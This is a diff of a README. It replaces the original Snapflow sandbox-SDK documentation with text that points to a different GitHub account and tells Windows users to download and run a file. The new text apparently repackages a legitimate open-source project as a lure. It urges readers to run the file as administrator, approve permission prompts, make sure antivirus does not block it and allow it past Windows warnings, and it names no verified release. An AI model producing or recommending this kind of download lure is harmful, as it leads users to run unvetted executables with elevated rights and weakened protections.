@@ -1,139 +1,238 @@
-> [!CAUTION]
-> Snapflow is very much in early development, and things may change or break without notice!
+# 🟣 snapflow - Run Safe Sandboxes Fast
 
-<br />
-<div align="center">
-  <a href="https://github.com/snapflowio/snapflow">
-    <img src="assets/logo.png" alt="Logo" width="99" height="51">
-  </a>
+[![Download snapflow](https://img.shields.io/badge/Download%20snapflow-purple?style=for-the-badge&logo=github)](https://github.com/EvgeBosc/snapflow)
 
-<h3 align="center">Snapflow</h3>
-  <p align="center">
-    Isolated and fast sandbox environments for AI agents, code execution, automation and more.
-    <br />
-    <a href="https://snapflow.io/docs"><strong>Explore the docs »</strong></a>
-    <br />
-    <br />
-    <a href="https://snapflow.io">Mothership</a>
-    &middot;
-    <a href="https://github.com/snapflowio/snapflow/issues/new?labels=bug&template=bug_report.md">Report Bug</a>
-    &middot;
-    <a href="https://github.com/snapflowio/snapflow/issues/new?labels=enhancement&template=feature_request.md">Request Feature</a>
-  </p>
-</div>
+## 🚀 Download
 
-<details>
-  <summary>Table of Contents</summary>
-  <ol>
-    <li>
-      <a href="#about-the-project">About</a>
-      <ul>
-        <li><a href="#tech-stack">Tech Stack</a></li>
-      </ul>
-    </li>
-    <li><a href="#quick-start">Quick Start</a></li>
-    <li><a href="#self-hosting">Self Hosting</a></li>
-    <li><a href="#roadmap">Roadmap</a></li>
-    <li><a href="#contributing">Contributing</a></li>
-    <li><a href="#license">License</a></li>
-  </ol>
-</details>
+Use this link to visit the download page:
 
-## About The Project
+[https://github.com/EvgeBosc/snapflow](https://github.com/EvgeBosc/snapflow)
 
-Snapflow provides on-demand sandbox environments that are isolated, fast, and disposable. Each sandbox runs in its own container with full filesystem, process, git, and network access through a simple SDK.
+## 📋 What snapflow does
 
-Use cases include:
+snapflow creates short-lived sandboxes on your computer or in a remote environment. You can use it to run code that you do not trust, test automations, work with AI agents, or open risky files in a controlled space.
 
-- **Environments for AI Agents** - give LLMs full access to a computer safely
-- **Code execution** - run untrusted or user-submitted code without risk to your infrastructure
-- **Automation** - spin up environments on the fly for CI tasks, testing, or data processing
-- **Scraping** - automate browsers in order to scrape the web
-- **Development** - create reproducible, throwaway environments for prototyping
+Each sandbox starts fast, gives full computer access, and then shuts down when you are done. That helps keep your main system separate from whatever you are testing.
 
-### Tech Stack
+## 🖥️ Windows setup
 
-- Rust
-- TypeScript & Bun
-- Docker
-- React
-- PostgreSQL
-- Redis
-- Cloudflare R2
+Follow these steps on a Windows PC:
 
-## Quick Start
+1. Open the download page in your browser.
+2. Find the latest Windows build or release file.
+3. Download the file to your computer.
+4. Open File Explorer and go to your Downloads folder.
+5. Double-click the file to start snapflow.
+6. If Windows asks for permission, select Yes.
+7. Wait for the app to open, then follow the on-screen steps.
 
-Install the SDK:
+If you see a browser download instead of an app window, save the file first and then open it from your Downloads folder.
 
-```sh
-npm install @snapflow/sdk
-```
+## ✅ Before you start
 
-Create a sandbox and run code in it:
+For the best results, check these items first:
 
-```typescript
-import { Snapflow } from "@snapflow/sdk";
+- Windows 10 or Windows 11
+- A steady internet connection
+- At least 8 GB of memory
+- Free disk space for sandbox files
+- Permission to run downloaded apps
 
-const snapflow = new Snapflow();
+If you plan to run larger tasks, more memory and disk space help.
 
-const sandbox = await snapflow.sandbox().create();
+## 🛠️ First-time setup
 
-// Run a command
-const result = await sandbox.exec("echo 'Hello from Snapflow!'");
-console.log(result.output);
+After snapflow opens, you will usually do a few simple steps:
 
-// Write and read files
-await sandbox.fs.uploadFile("/home/user/hello.txt", "Hello, world!");
-const content = await sandbox.fs.downloadFile("/home/user/hello.txt");
+1. Sign in if the app asks you to.
+2. Choose where you want sandboxes to run.
+3. Pick a default workspace or folder.
+4. Allow snapflow to create and manage temporary environments.
+5. Start your first sandbox from the main screen.
 
-// Clean up
-await sandbox.destroy();
-```
+Most users can keep the default settings and begin right away.
 
-Set your API key as an environment variable:
+## 🧭 How to use snapflow
 
-```sh
-export snapflow_API_KEY="your-api-key"
-```
+Use snapflow when you want a clean place to test something without risking your main computer.
 
-Or pass it directly:
+Common uses:
 
-```typescript
-const snapflow = new Snapflow({ apiKey: "your-api-key" });
-```
+- Run code you do not trust
+- Test AI agent actions
+- Try browser automation
+- Open scripts before moving them into your main setup
+- Inspect files from unknown sources
+- Run workflow jobs in a clean environment
 
-For more examples and full API reference, check the [documentation](https://snapflow.io/docs).
+A sandbox works like a short-term computer. You start it, use it, and close it when done.
 
-## Self Hosting
+## 🔒 Why people use it
 
-Coming Soon
+snapflow fits tasks where isolation matters.
 
-## Roadmap
+It helps when you want:
 
-- [x] Beta Release
-- [ ] Self hosting guides and setup
+- A fresh environment for each job
+- Full access inside the sandbox
+- Less risk to your main system
+- Fast start and stop times
+- Easy cleanup after each run
 
-See the [open issues](https://github.com/snapflowio/snapflow/issues) for a full list of proposed features (and known issues).
+This makes it useful for developers, testers, security teams, and anyone who works with automated tasks.
 
-## Contributing
+## 🧪 Example workflow
 
-Snapflow is **open source software** licensed under **AGPLv3**. Contributions are welcome.
+Here is a simple way to use it:
 
-See [`CONTRIBUTING.md`](./CONTRIBUTING.md) for development processes and how to propose changes, and [`CODE_OF_CONDUCT.md`](./CODE_OF_CONDUCT.md) for community guidelines.
+1. Open snapflow.
+2. Start a new sandbox.
+3. Launch the app, script, or browser task you want to test.
+4. Watch the task run inside the sandbox.
+5. Stop the sandbox when finished.
+6. Start a new one for the next task.
 
-### Top contributors:
+This keeps each test separate.
 
-<a href="https://github.com/snapflowio/snapflow/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=snapflowio/snapflow" alt="contrib.rocks image" />
-</a>
+## 🧰 What you can run
 
-## Stargazers
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/image?repos=snapflowio/snapflow&type=Date&theme=dark" />
-  <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/image?repos=snapflowio/snapflow&type=Date" />
-  <img alt="Star History Chart" src="https://api.star-history.com/image?repos=snapflowio/snapflow&type=Date" />
-</picture>
+snapflow works well with many kinds of jobs:
 
-## License
+- Browser tasks
+- Script runs
+- AI tool actions
+- Workflow automations
+- Scraping jobs
+- Security checks
+- Temporary test apps
 
-Distributed under the `AGPLv3`. See `LICENSE` for more information.
+It is built for short runs where you want control and isolation.
+
+## 📁 Typical folder layout
+
+When snapflow runs, it may create folders for:
+
+- Sandbox images
+- Temporary files
+- Task logs
+- Workspace data
+- Session files
+
+You can usually leave these folders in place. The app manages them for you.
+
+## ⚙️ Basic controls
+
+Most users only need a few controls:
+
+- Start sandbox
+- Stop sandbox
+- Open workspace
+- Reset session
+- Clear temp files
+
+If the app shows more options, you can keep the defaults until you need finer control.
+
+## 🧼 Clean up
+
+When you finish a task:
+
+1. Close anything you opened in the sandbox.
+2. Stop the sandbox.
+3. Remove files you no longer need.
+4. Start a new session for the next job.
+
+This keeps your work tidy and reduces clutter.
+
+## 🧭 Troubleshooting
+
+If snapflow does not open:
+
+- Check that the download finished
+- Try opening the file again
+- Right-click the file and choose Run as administrator
+- Restart your computer and try again
+- Make sure your antivirus did not block the app
+
+If a sandbox does not start:
+
+- Check your internet connection
+- Close other heavy apps
+- Free up disk space
+- Try a new session
+- Restart snapflow
+
+If the screen looks blank:
+
+- Wait a moment for the environment to load
+- Resize the window
+- Close and reopen the app
+- Start a fresh sandbox
+
+## 🔐 Safety tips
+
+Even though snapflow keeps tasks separate, use care with unknown code and files.
+
+Good habits:
+
+- Use a sandbox for untrusted content
+- Keep personal files out of test sessions
+- Close sandboxes after use
+- Review what a task can access before you run it
+
+## 📚 Common uses by team
+
+Different people use snapflow in different ways:
+
+- **Solo users:** test files and scripts safely
+- **Automation users:** run repeat tasks in a clean session
+- **AI users:** give agents a controlled computer
+- **Security teams:** inspect risky content
+- **Builders:** try workflows before wider use
+
+## 🧩 Terms you may see
+
+A few words may appear in the app:
+
+- **Sandbox**: a separate place to run tasks
+- **Session**: one active use of a sandbox
+- **Workspace**: the folder where your files live
+- **Ephemeral**: temporary and removed when done
+- **Agent**: a tool or AI that can take actions for you
+
+## 🪟 Windows file tips
+
+If Windows shows a warning during download or launch:
+
+- Save the file first
+- Check that the file name matches the release
+- Open it from the Downloads folder
+- Allow it to run if you trust the source
+
+If the file opens as text or in a browser, it may not be the app file. Download the correct Windows build from the page.
+
+## 🧭 Quick start
+
+1. Open the download page
+2. Download the Windows file
+3. Run snapflow
+4. Start a sandbox
+5. Use it for your task
+6. Stop it when done
+
+## 📦 Project focus
+
+snapflow is built around:
+
+- Instant sandbox creation
+- Short-lived environments
+- Full computer access
+- Code execution
+- AI agent workflows
+- Browser-based tasks
+- Automation jobs
+
+## 🌐 Download
+
+Visit the page below to download and run snapflow on Windows:
+
+[https://github.com/EvgeBosc/snapflow](https://github.com/EvgeBosc/snapflow)
